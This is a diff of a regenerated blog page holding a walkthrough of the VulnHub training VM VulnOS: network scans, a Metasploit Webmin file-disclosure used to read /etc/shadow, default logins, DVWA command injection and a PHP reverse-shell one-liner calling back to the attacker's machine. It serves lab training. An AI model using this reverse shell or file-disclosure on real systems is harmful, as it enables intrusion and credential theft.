@@ -6,12 +6,14 @@
 
     <head>
     <link href="https://gmpg.org/xfn/11" rel="profile">
+    
+    <link rel="canonical" href="http://paulsec.github.io/posts/vulnos-write-up/">
+    
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.62.0" />
+<meta name="generator" content="Hugo 0.107.0">
 
     
     
@@ -23,21 +25,22 @@
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="VulnOS Write-up"/>
 <meta name="twitter:description" content="This contains the solution of the VM: VulnOS.
-This is my first write-up for a VM and I&#39;m doing it for VulnOS which is hosted on VulnHub (Great resource if you want to improve your pentesting skills).
-In this &lsquo;tutorial&rsquo;, I&#39;m gonna give you the steps I reproduced to get a shell on the machine.
-Discovery First, start by scanning the network to discover where&#39;s the host.
+This is my first write-up for a VM and I&rsquo;m doing it for VulnOS which is hosted on VulnHub (Great resource if you want to improve your pentesting skills).
+In this &rsquo;tutorial&rsquo;, I&rsquo;m gonna give you the steps I reproduced to get a shell on the machine.
+Discovery First, start by scanning the network to discover where&rsquo;s the host.
 nmap -sV 192.168.56.1/24 Starting Nmap 6."/>
 
 <meta property="og:title" content="VulnOS Write-up" />
 <meta property="og:description" content="This contains the solution of the VM: VulnOS.
-This is my first write-up for a VM and I&#39;m doing it for VulnOS which is hosted on VulnHub (Great resource if you want to improve your pentesting skills).
-In this &lsquo;tutorial&rsquo;, I&#39;m gonna give you the steps I reproduced to get a shell on the machine.
-Discovery First, start by scanning the network to discover where&#39;s the host.
+This is my first write-up for a VM and I&rsquo;m doing it for VulnOS which is hosted on VulnHub (Great resource if you want to improve your pentesting skills).
+In this &rsquo;tutorial&rsquo;, I&rsquo;m gonna give you the steps I reproduced to get a shell on the machine.
+Discovery First, start by scanning the network to discover where&rsquo;s the host.
 nmap -sV 192.168.56.1/24 Starting Nmap 6." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://paulsec.github.io/posts/vulnos-write-up/" />
+<meta property="og:url" content="http://paulsec.github.io/posts/vulnos-write-up/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2014-04-08T00:00:00+00:00" />
 <meta property="article:modified_time" content="2014-04-08T00:00:00+00:00" /><meta property="og:site_name" content="PaulSec&#39;s Blog" />
+
 
 
     
@@ -47,7 +50,7 @@ nmap -sV 192.168.56.1/24 Starting Nmap 6." />
 
 
 
-<link rel="stylesheet" href="/scss/hyde-hyde.92c66d107d7b219f0792cfd67223179af884b03f386ac46894f9f735932bbca3.css" integrity="sha256-ksZtEH17IZ8Hks/WciMXmviEsD84asRolPn3NZMrvKM=">
+<link rel="stylesheet" href="/scss/hyde-hyde.3081c4981fb69a2783dd36ecfdd0e6ba7a158d4cbfdd290ebce8f78ba0469fc6.css" integrity="sha256-MIHEmB&#43;2mieD3Tbs/dDmunoVjUy/3SkOvOj3i6BGn8Y=">
 
 
 <link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
@@ -74,7 +77,11 @@ nmap -sV 192.168.56.1/24 Starting Nmap 6." />
   <div class="container ">
     <div class="sidebar-about">
       <span class="site__title">
-        <a href="http://paulsec.github.io/"></a>
+        <a href="http://paulsec.github.io/">
+        
+          
+        
+        </a>
       </span>
       
         
@@ -131,7 +138,12 @@ nmap -sV 192.168.56.1/24 Starting Nmap 6." />
 	
 	
 	
+	
 	<a href="https://github.com/PaulSec" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
 	
 	
 	
@@ -153,7 +165,7 @@ nmap -sV 192.168.56.1/24 Starting Nmap 6." />
     </div>
     
 <div class="copyright">
-  &copy; 2021 Paul A.
+  &copy; 2023 Paul A.
   
     <a href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>
   
@@ -208,11 +220,11 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
   
   <div class="post">
     <p><strong>This contains the solution of the VM: VulnOS.</strong></p>
-<p>This is my first write-up for a VM and I'm doing it for VulnOS which is hosted on <a href="http://vulnhub.com/">VulnHub</a> (Great resource if you want to improve your pentesting skills).</p>
-<p>In this &lsquo;tutorial&rsquo;, I'm gonna give you the steps I reproduced to get a shell on the machine.</p>
+<p>This is my first write-up for a VM and I&rsquo;m doing it for VulnOS which is hosted on <a href="http://vulnhub.com/">VulnHub</a> (Great resource if you want to improve your pentesting skills).</p>
+<p>In this &rsquo;tutorial&rsquo;, I&rsquo;m gonna give you the steps I reproduced to get a shell on the machine.</p>
 <h4 id="discovery">Discovery</h4>
-<p>First, start by scanning the network to discover where's the host.</p>
-<pre><code>nmap -sV 192.168.56.1/24
+<p>First, start by scanning the network to discover where&rsquo;s the host.</p>
+<pre tabindex="0"><code>nmap -sV 192.168.56.1/24
 
 Starting Nmap 6.41SVN ( http://nmap.org ) at 2014-04-08 21:23 CEST
 Nmap scan report for 192.168.56.1
@@ -220,12 +232,12 @@ Host is up (0.00049s latency).
 Nmap scan report for 192.168.56.105
 Host is up (0.00018s latency).
 </code></pre><p>We managed to get the IP of the machine.
-Let's do some fingerprinting.</p>
+Let&rsquo;s do some fingerprinting.</p>
 <h4 id="fingerprinting">Fingerprinting</h4>
 <p>I still used <a href="http://nmap.org/">nmap</a> to do this :
 <!-- raw HTML omitted --></p>
 <p>Port 80 and 8080 are open. I used <a href="https://www.cirt.net/Nikto2">nikto</a> and <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a> to do even more fingerprinting.</p>
-<pre><code>./nikto.pl -h http://192.168.56.105
+<pre tabindex="0"><code>./nikto.pl -h http://192.168.56.105
 - Nikto v2.1.5
 ---------------------------------------------------------------------------
 + Target IP:          192.168.56.105
@@ -257,9 +269,8 @@ Let's do some fingerprinting.</p>
 + End Time:           2014-04-08 21:30:08 (GMT2) (21 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-
 </code></pre><p>I also used DirBuster to get some folders :</p>
-<pre><code>Starting OWASP DirBuster 0.12
+<pre tabindex="0"><code>Starting OWASP DirBuster 0.12
 Starting dir/file list based brute forcing
 Dir found: /cgi-bin/ - 403
 Dir found: / - 200
@@ -315,13 +326,13 @@ File found: /phpldapadmin/js/jscalendar/calendar.js - 200
 File found: /phpldapadmin/js/layersmenu-browser_detection.js - 200
 File found: /phpldapadmin/js/ajax_tree.js - 200
 </code></pre><p>On the port 8080, nothing much with DirBuster :</p>
-<pre><code>Starting dir/file list based brute forcing
+<pre tabindex="0"><code>Starting dir/file list based brute forcing
 Dir found: / - 200
 Dir found: /docs/ - 200
 Dir found: // - 200
 Dir found: // - 200
 </code></pre><p>And with Nikto:</p>
-<pre><code>./nikto.pl -h http://192.168.56.105:8080
+<pre tabindex="0"><code>./nikto.pl -h http://192.168.56.105:8080
 - Nikto v2.1.5
 ---------------------------------------------------------------------------
 + Target IP:          192.168.56.105
@@ -332,10 +343,10 @@ Dir found: // - 200
 + Server: Apache-Coyote/1.1
 + Server leaks inodes via ETags, header found with file /, fields: 0xW/1887 0x1394395959000 
 + The anti-clickjacking X-Frame-Options header is not present.
-+ No CGI Directories found (use '-C all' to force check all possible dirs)
++ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)
 + Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
-+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
-+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.
 + /: Appears to be a default Apache Tomcat install.
 + /examples/servlets/index.html: Apache Tomcat default JSP pages present.
 + Cookie JSESSIONID created without the httponly flag
@@ -346,15 +357,15 @@ Dir found: // - 200
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 </code></pre><p>Thanks to the nmap scan, there are a lot of services which are available.
-I did lot of attempts to exploit MySQL, the IRC daemon, SMTP, .. but it didn't work.</p>
+I did lot of attempts to exploit MySQL, the IRC daemon, SMTP, .. but it didn&rsquo;t work.</p>
 <p>Then, I decided to check Webmin service.</p>
 <h4 id="exploitation">Exploitation</h4>
 <p>To do so, I started to use Metasploit to see if there was relevant exploit.
 And there was one :</p>
-<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
 <p>I decided to use <em>auxiliary/admin/webmin/file_disclosure</em>.</p>
-<p>Using this flaw, I've been able to get <strong>/etc/shadow</strong> because we have root privileges.</p>
-<pre><code>root:*:16137:0:99999:7:::
+<p>Using this flaw, I&rsquo;ve been able to get <strong>/etc/shadow</strong> because we have root privileges.</p>
+<pre tabindex="0"><code>root:*:16137:0:99999:7:::
 daemon:*:16137:0:99999:7:::
 bin:*:16137:0:99999:7:::
 sys:*:16137:0:99999:7:::
@@ -398,9 +409,9 @@ snmp:*:16138:0:99999:7:::
 nagios:!:16140:0:99999:7:::
 openerp:*:16140:0:99999:7:::
 </code></pre><p>We can now use this and (try to) crack the password with John the ripper.</p>
-<p>However, this hasn't been successful for me.
-So, I decided to get Apache's access logs.
-Thanks to this, I've been able to detect even more Web applications: MediaWiki, dolibarr-3.0.0, egroupware, And DVWA (Damn Vulnerable Web App)&hellip;</p>
+<p>However, this hasn&rsquo;t been successful for me.
+So, I decided to get Apache&rsquo;s access logs.
+Thanks to this, I&rsquo;ve been able to detect even more Web applications: MediaWiki, dolibarr-3.0.0, egroupware, And DVWA (Damn Vulnerable Web App)&hellip;</p>
 <p>I also had access to all the files I wanted, so I gathered credentials for the database.
 It was then possible to login through the phpmyadmin pannel using: <strong>webmin</strong>/<strong>webmin</strong>.</p>
 <!-- raw HTML omitted -->
@@ -408,19 +419,18 @@ It was then possible to login through the phpmyadmin pannel using: <strong>webmi
 <!-- raw HTML omitted -->
 <h4 id="access-maintenance">Access maintenance</h4>
 <p>I decided to check Damn Vulnerable Web App at the address : http://192.168.56.105/DVWA-1.0.8/
-You can log in the page using the installation's credentials : admin/password.</p>
+You can log in the page using the installation&rsquo;s credentials : admin/password.</p>
 <p>Then, disable <strong>&ldquo;High&rdquo;</strong> security and you can do Remote Command Execution.
-It's time to get a reverse shell !</p>
+It&rsquo;s time to get a reverse shell !</p>
 <p>On your machine, type :</p>
-<pre><code>nc -lvp 1337
+<pre tabindex="0"><code>nc -lvp 1337
 </code></pre><p>Because the Netcat version which is on the VM does not contain the <strong>-e</strong> option, I found a nice trick using PHP :</p>
-<pre><code>; php -r '$sock=fsockopen(&quot;192.168.56.101&quot;,1337);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
-
-</code></pre><p>However, we don't have enough access&hellip;</p>
-<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre><p>Then, Thanks to D4rk, I created a cgi script in DVWA's folder:</p>
-<p><!-- raw HTML omitted --></p>
-<p>Using Webmin's exploit, just change <em>RPATH</em> to the new file and <strong>exploit</strong>.</p>
+<pre tabindex="0"><code>; php -r &#39;$sock=fsockopen(&#34;192.168.56.101&#34;,1337);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
+</code></pre><p>However, we don&rsquo;t have enough access&hellip;</p>
+<pre tabindex="0"><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>Then, Thanks to D4rk, I created a cgi script in DVWA&rsquo;s folder:</p>
+<!-- raw HTML omitted -->
+<p>Using Webmin&rsquo;s exploit, just change <em>RPATH</em> to the new file and <strong>exploit</strong>.</p>
 <!-- raw HTML omitted -->
 <p>Hope you liked it and that you learnt something. :-)</p>
 
@@ -456,16 +466,7 @@ It's time to get a reverse shell !</p>
         
     
 
-<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
-
-
-    
-    
-    <script type="text/javascript">
-        
-        hljs.initHighlightingOnLoad();
-    </script>
-    
+<script defer src="https://use.fontawesome.com/releases/v5.12.1/js/all.js" integrity="sha384-ZbbbT1gw3joYkKRqh0kWyRp32UAvdqkpbLedQJSlnI8iLQcFVxaGyrOgOJiDQTTR" crossorigin="anonymous"></script>
 
 
 
